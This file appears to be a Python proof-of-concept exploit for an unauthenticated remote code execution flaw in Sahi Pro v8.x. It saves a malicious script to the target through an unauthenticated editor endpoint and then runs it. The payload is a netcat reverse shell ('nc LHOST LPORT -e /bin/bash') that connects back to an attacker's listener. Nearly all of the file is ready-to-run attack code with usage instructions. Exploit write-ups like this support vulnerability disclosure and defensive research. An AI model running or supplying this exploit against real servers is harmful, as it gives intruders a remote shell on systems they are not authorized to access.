#!/usr/bin/python
  
import sys, requests
import colorama, random, urllib
from colorama import Fore
 
def bannerche():
    print '''
 @-------------------------------------------------------------@
 |       Sahi Pro v8.x - Unauthenticated RCE Exploit           |
 |              Vulnerability discovered by AkkuS              |
 |               My Blog - https://pentest.com.tr              |
 @-------------------------------------------------------------@
          '''
bannerche()
  
def check_nc(rhost,lport):
   choose = str(raw_input(Fore.RED + "+ [!] Do you listening "+rhost+" "+lport+" with netcat? (y/n): "))
   if choose == "n":
      return False
   else:
      return True

def execute_command(rhost,rport,filename):
   runuri = "http://"+rhost+":"+rport+"/_s_/sprm/_s_/dyn/Player_setScriptFile"
   runheaders = {"Connection": "close"}
   rundata = "dir=%2Froot%2Fsahi_pro%2Fuserdata%2Fscripts%2F&file="+filename+"&starturl=&manual=0"
   runsah = requests.post(runuri, headers=runheaders, data=rundata)

   if runsah.status_code == 200:    
      print (Fore.GREEN + "+ [*] Script was executed. Please wait for the session...")
   else:
      print (Fore.RED + "+ [X] Failed to run script.")
      sys.exit()

def create_sah(rhost,rport,scdir,lhost,lport):
 
   filename = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for i in range(7)) + ".sah"
   payload = "_execute%28%27nc+"+lhost+"+"+lport+"+-e+%2Fbin%2Fbash%27%29%0A" # it depends I used netcat for PoC
   sahuri = "http://"+rhost+":"+rport+"/_s_/dyn/pro/EditorUI_saveScript?"+urllib.urlencode({ 'dir' : scdir})+"&file="+filename+"&contents="+payload+""
   saheaders = {"Connection": "close"}
   sahreq = requests.get(sahuri, headers=saheaders)

   if sahreq.status_code == 200:    
      print (Fore.GREEN + "+ [*] "+filename+" script created successfully!")
      execute_command(rhost,rport,filename)
   else:
      print (Fore.RED + "+ [X] Failed to create "+filename+" script.")
      sys.exit()

def main():

   if (len(sys.argv) != 6):
       print "[*] Usage: poc.py <RHOST> <RPORT> <SCDIR> <LHOST> <LPORT>"
       print "[*] <RHOST> -> Target IP"
       print "[*] <RPORT> -> Target Port"
       print "[*] <SCDIR> -> Target Script Directory"
       print "[*] <LHOST> -> Attacker IP"
       print "[*] <LPORT> -> Attacker Port"
       print "[*] Example: poc.py 192.168.1.2 9999 /root/sahi_pro/userdata/scripts/ 192.168.1.9 4444"
       exit(0)
  
   rhost = sys.argv[1]
   rport = sys.argv[2]
   scdir = sys.argv[3]
   lhost = sys.argv[4]
   lport = sys.argv[5]

   if not check_nc(rhost,rport):
      print (Fore.RED + "+ [*] Please listen to the port required for the session and run exploit again!")
   else:
      create_sah(rhost,rport,scdir,lhost,lport)
      
if __name__ == "__main__":
    main()
            
